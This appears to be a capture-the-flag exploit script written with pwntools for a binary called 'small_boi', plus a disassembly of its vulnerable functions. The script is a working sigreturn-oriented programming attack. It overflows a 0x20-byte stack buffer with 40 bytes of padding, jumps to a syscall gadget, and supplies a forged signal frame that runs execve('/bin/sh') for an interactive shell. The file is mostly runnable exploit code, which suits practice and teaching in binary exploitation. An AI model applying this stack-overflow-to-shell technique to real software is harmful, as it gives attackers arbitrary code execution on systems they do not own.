from pwn import *

gdbcmds = '''
b *0x0040018c
c
'''
context.arch = 'amd64'
elf = ELF('./small_boi')
target = process('./small_boi')
#target = gdb.debug('./small_boi', gdbscript=gdbcmds)

frame = SigreturnFrame()
frame.rip = 0x400185 # 0x1000000b addr for syscall
frame.rax = 0x3b  # execv syscall
frame.rdi = 0x4001ca # /bin/sh addr
frame.rsi = 0x0
frame.rdx = 0x0

payload = b'\x00'*40 + p64(0x00400180) + bytes(frame)

target.send(payload)
target.interactive()


'''

                             FUN_0040017c
        0040017c 55              PUSH       RBP
        0040017d 48 89 e5        MOV        RBP,RSP
        00400180 b8 0f 00        MOV        EAX,0xf
                 00 00
        00400185 0f 05           SYSCALL
        00400187 90              NOP
        00400188 5d              POP        RBP
        00400189 c3              RET
        0040018a 58              ??         58h    X
        0040018b c3              ??         C3h
        
        
                             FUN_0040018c
        0040018c 55              PUSH       RBP
        0040018d 48 89 e5        MOV        RBP,RSP
        00400190 48 8d 45 e0     LEA        RAX=>local_28,[RBP + -0x20]
        00400194 48 89 c6        MOV        RSI,RAX
        00400197 48 31 c0        XOR        RAX,RAX
        0040019a 48 31 ff        XOR        RDI,RDI
        0040019d 48 c7 c2        MOV        RDX,0x200
                 00 02 00 00
        004001a4 0f 05           SYSCALL
        004001a6 b8 00 00        MOV        EAX,0x0
                 00 00
        004001ab 5d              POP        RBP
        004001ac c3              RET


'''
